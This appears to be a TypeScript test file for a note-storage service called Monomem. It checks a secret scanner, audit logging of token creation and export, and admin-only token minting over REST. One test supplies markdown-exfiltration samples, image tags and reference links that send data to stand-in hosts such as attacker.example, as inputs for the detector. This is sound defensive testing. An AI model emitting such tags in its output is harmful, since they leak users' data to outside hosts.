import "./setup-env.js"; // throwaway MONOMEM_HOME before src loads, so a file run alone never touches the real data folder
// Expert round 1: the secret guard catches Monomem's own tokens and more common credential shapes; token minting,
// removal and export land in the audit log; REST cannot mint admin / no-limit apps unless the caller is the main token.
import { test, describe, after } from "node:test";
import assert from "node:assert/strict";
import { existsSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import type { AddressInfo } from "node:net";
import { lintContent, scanForInjection } from "../src/lint.js";
import { scanForSecrets, auditPath, audit, auditFailureCount } from "../src/security.js";
import { DATA_DIR } from "../src/config.js";
import { Store } from "../src/store.js";
import { createApiServer } from "../src/api.js";
import { addApp, removeApp } from "../src/tokens-admin.js";

const j = (...p: string[]): string => p.join(""); // no credential-shaped literal in this file
const HEX = "0123456789abcdef".repeat(4);

describe("secret guard: new shapes", () => {
  test("token-named assignments with a real-looking value block; references and counts do not", () => {
    for (const t of [`MONOMEM_TOKEN=${HEX}`, `{"token":"${HEX}"}`, `access_token: ${HEX}`, `auth-token = ${HEX}`]) assert.ok(scanForSecrets(t), t);
    for (const t of ["token: <your token here>", "token: required", "max_tokens: 4096", "token = 12345", "token: $MONOMEM_TOKEN", "the token: see docs"]) assert.equal(scanForSecrets(t), null, t);
  });

  test("one positive and one placeholder per new pattern", () => {
    const cases: Array<[string, string, string]> = [
      ["Authorization header", `curl -H "Authorization: Bearer ${j("abcDEF123", "456ghiJKL789mno")}" http://x`, "Authorization: Bearer $TOKEN"],
      ["password in a URL", j("postgres://app:", "s3cretPw9", "@db.example.com/app"), "postgres://localhost/app"],
      ["password in a URL", j("mongodb+srv://u:", "Hunter22x", "@cluster0.example.net"), "postgres://user:<password>@localhost/app"],
      ["Slack webhook", j("https://hooks.slack.com/services/", "T0ABCDEFG/B0ABCDEFG/", "abcdefghijKLMNOPQRST1234"), "https://hooks.slack.com/services/T000/B000/XXXX"],
      ["Discord webhook", j("https://discord.com/api/webhooks/", "123456789012345678/", "a".repeat(30), "B".repeat(30)), "https://discord.com/api/webhooks/<id>/<token>"],
      ["Hugging Face token", j("hf_", "AbCdEfGhIjKlMnOpQrStUvWxYz0123"), "hf_xxx"],
      ["Azure storage key", j("DefaultEndpointsProtocol=https;AccountName=a;AccountKey=", "A".repeat(43), "B=="), "AccountKey=<key>"],
    ];
    for (const [label, pos, neg] of cases) {
      assert.equal(scanForSecrets(pos), label, pos);
      assert.equal(scanForSecrets(neg), null, neg);
    }
  });

  test("a currently configured token is blocked verbatim, and the finding never echoes it", () => {
    const file = join(DATA_DIR, "tokens.json");
    const had = existsSync(file) ? readFileSync(file, "utf8") : null;
    // A value with no recognisable shape: only the exact-token check can catch it.
    const secret = "Zq" + "x".repeat(30) + "Plain";
    try {
      writeFileSync(file, JSON.stringify([{ token: secret, scope: "read", label: "r1-probe" }]));
      const f = lintContent({ title: "notes", body: `the key is ${secret} ok` });
      const hit = f.find((x) => x.category === "secret");
      assert.ok(hit, "blocked");
      assert.equal(hit!.label, "Monomem access token");
      assert.ok(!JSON.stringify(f).includes(secret), "the value is not echoed");
      assert.equal(lintContent({ title: "notes", body: "nothing here" }).length, 0);
    } finally {
      if (had === null) rmSync(file, { force: true });
      else writeFileSync(file, had);
    }
  });

  test("the exact snippet POST /tokens prints is refused as a note", () => {
    process.env.MONOMEM_TOKEN = "p".repeat(40);
    try {
      const made = addApp({ label: "r1-snippet", max: "public" });
      try {
        // connectionSnippet's text (JSON headers, curl and PowerShell lines) all carry the token.
        const snippet = `{"mcpServers":{"monomem":{"url":"http://127.0.0.1:8791/mcp","headers":{"Authorization":"Bearer ${made.token}"}}}}\n  curl -H "Authorization: Bearer ${made.token}" http://127.0.0.1:8787/whoami`;
        const f = lintContent({ title: "connect", body: snippet });
        assert.ok(f.some((x) => x.category === "secret"), JSON.stringify(f));
        assert.ok(!JSON.stringify(f).includes(made.token));
      } finally {
        removeApp("r1-snippet");
      }
    } finally {
      delete process.env.MONOMEM_TOKEN;
    }
  });

  test("markdown exfiltration: <img src> and reference-style images; badges and plain reference links pass", () => {
    for (const t of [
      '<img src="https://evil.test/p.gif?d=secret">',
      "<img alt=x src=http://10.0.0.5/a.png?leak=1>",
      "Done ![s][r]\n\n[r]: https://attacker.example/p?data=abc",
    ]) assert.equal(scanForInjection(t), "markdown exfiltration", t);
    for (const t of [
      '<img src="https://img.shields.io/npm/v/monomem?style=flat">',
      '<img src="https://example.com/arch.png">',
      "See [docs][d]\n\n[d]: https://example.com/search?q=monomem",
      "![b][s]\n\n[s]: https://img.shields.io/x?style=flat",
    ]) assert.equal(scanForInjection(t), null, t);
  });
});

describe("audit: token minting and export are recorded, never the secret", () => {
  const lines = (): string => (existsSync(auditPath()) ? readFileSync(auditPath(), "utf8") : "");
  const ADMIN = "a".repeat(40), OTHER = "o".repeat(40);
  const servers: Array<() => Promise<void>> = [];
  after(async () => {
    for (const c of servers) await c();
  });
  const boot = async () => {
    const s = new Store(":memory:");
    const server = createApiServer(s, [{ token: ADMIN, scope: "admin", label: "primary" }, { token: OTHER, scope: "admin", label: "ops" }] as never);
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    servers.push(async () => {
      await new Promise<void>((r) => server.close(() => r()));
      s.close();
    });
    return (t: string, p: string, init: RequestInit = {}): Promise<Response> => fetch(base + p, { ...init, headers: { Authorization: `Bearer ${t}`, "Content-Type": "application/json" } });
  };

  test("CLI-path addApp/removeApp write token.add / token.remove with no secret", () => {
    const made = addApp({ label: "r1-audit", max: "internal" });
    removeApp("r1-audit");
    const log = lines();
    assert.match(log, /"op":"token.add","label":"cli","kind":"token","detail":"r1-audit scope=write ns=- max=internal"/);
    assert.match(log, /"op":"token.remove","label":"cli","kind":"token","detail":"r1-audit"/);
    assert.ok(!log.includes(made.token), "the secret never reaches audit.log");
  });

  test("REST: admin / no_limit minting needs the primary token; the caller label is audited; export is audited", async () => {
    const call = await boot();
    for (const body of [{ label: "r1-x", admin: true }, { label: "r1-y", no_limit: true }]) {
      const r = await call(OTHER, "/tokens", { method: "POST", body: JSON.stringify(body) });
      assert.equal(r.status, 403);
      assert.match(((await r.json()) as { error: string }).error, /only the main \(primary\) token/);
    }
    const ok = await call(OTHER, "/tokens", { method: "POST", body: JSON.stringify({ label: "r1-plain" }) });
    assert.equal(ok.status, 201);
    const tok = ((await ok.json()) as { token: string }).token;
    assert.equal((await call(ADMIN, "/tokens", { method: "POST", body: JSON.stringify({ label: "r1-admin", admin: true }) })).status, 201);
    assert.equal((await call(OTHER, "/tokens/r1-plain", { method: "DELETE" })).status, 200);
    assert.equal((await call(ADMIN, "/tokens/r1-admin", { method: "DELETE" })).status, 200);
    const ex = await call(ADMIN, "/export");
    assert.equal(ex.status, 200);
    await ex.text();
    const log = lines();
    assert.match(log, /"op":"token.add","label":"ops","kind":"token","detail":"r1-plain scope=write/);
    assert.match(log, /"op":"token.add","label":"primary","kind":"token","detail":"r1-admin scope=admin/);
    assert.match(log, /"op":"token.remove","label":"ops"/);
    assert.match(log, /"op":"export","label":"primary","kind":"export","detail":"rest notes=0/);
    assert.ok(!log.includes(tok));
  });

  test("a failing audit write is counted and shown in GET /stats", async () => {
    const before = auditFailureCount();
    const prev = process.env.MONOMEM_AUDIT_LOG;
    // A path under an existing FILE cannot be created on any platform.
    const blocker = join(DATA_DIR, "r1-not-a-dir");
    writeFileSync(blocker, "x");
    process.env.MONOMEM_AUDIT_LOG = join(blocker, "audit.log");
    const errs: string[] = [];
    const orig = console.error;
    console.error = (...a: unknown[]) => void errs.push(a.join(" "));
    try {
      audit({ op: "probe" });
      audit({ op: "probe" });
    } finally {
      console.error = orig;
      if (prev === undefined) delete process.env.MONOMEM_AUDIT_LOG;
      else process.env.MONOMEM_AUDIT_LOG = prev;
      rmSync(blocker, { force: true });
    }
    assert.equal(auditFailureCount(), before + 2);
    if (before === 0) assert.equal(errs.filter((e) => /could not write the audit log/.test(e)).length, 1, "one warning, not one per failure");
    const call = await boot();
    const stats = (await (await call(ADMIN, "/stats")).json()) as { audit_failures: number };
    assert.equal(stats.audit_failures, auditFailureCount());
  });
});
